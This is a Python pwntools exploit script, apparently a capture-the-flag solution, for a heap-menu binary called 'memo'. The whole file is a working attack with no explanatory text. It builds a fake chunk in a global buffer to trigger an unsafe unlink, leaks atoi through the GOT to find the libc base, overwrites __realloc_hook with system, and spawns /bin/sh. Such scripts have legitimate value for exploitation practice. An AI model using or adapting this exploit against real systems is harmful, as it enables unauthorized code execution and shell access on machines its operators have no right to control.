#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']

elf = context.binary = ELF('./memo')
libc = elf.libc

gs = '''
c
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)


io = start()
sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()


def c(idx):
    sla("exit\n",idx)

def malloc(size,content):
    c(3)
    sla("Input the new page size (bytes):\n",size)
    sla("Input the new content of this page:\n",content)

def fill(content):
    c(2)
    sla("Input the new content of this page:\n",content)

def show():
    c(1)

def changename(name):
    c(4)
    sla("Input your new name:\n",name)

def changetitle(title):
    c(5)
    sla("Input your new title:\n",title)

def get_libc():
    show()
    rl()
    return u64(rc(8)[0:6].ljust(8,b"\x00"))


ptr = 0x602040
page_content = 0x602038
payload1 = flat([
    p64(0),
    p64(0x20),
    p64(ptr-0x18),
    p64(ptr-0x10),
    p64(0x20),
    p64(0x40),
])
changename(payload1.decode("iso-8859-1"))
payload2 = flat([
    p64(0)*6,
    p64(0),
    p64(0x21),
    p64(0)*2,
    p64(0x0),
    p64(0x21),
])
fill(payload2.decode("iso-8859-1"))
malloc(0x400, "1")
malloc(0x100, "2")

payload3 = flat([
    p64(0)*2,
    p64(elf.got['atoi']),
    p64(page_content),
])
changename(payload3.decode("iso-8859-1"))

show()
io.recvline()
addr = u64(rc(8)[0:6].ljust(8,b"\x00"))
libc.address = addr -  libc.sym['atoi']
lg("libc", libc.address)
changename((p64(0x602050) + p64(page_content)).decode("iso-8859-1"))
fill(p64(0).decode("iso-8859-1"))
input()
changename((p64(libc.sym['__realloc_hook']) + p64(page_content)).decode("iso-8859-1"))
fill(p64(libc.sym['system']).decode("iso-8859-1"))
changename(p64(next(libc.search(b"/bin/sh"))).decode("iso-8859-1"))
io.sendline("3")
io.sendline(str(0x100))


io.interactive()
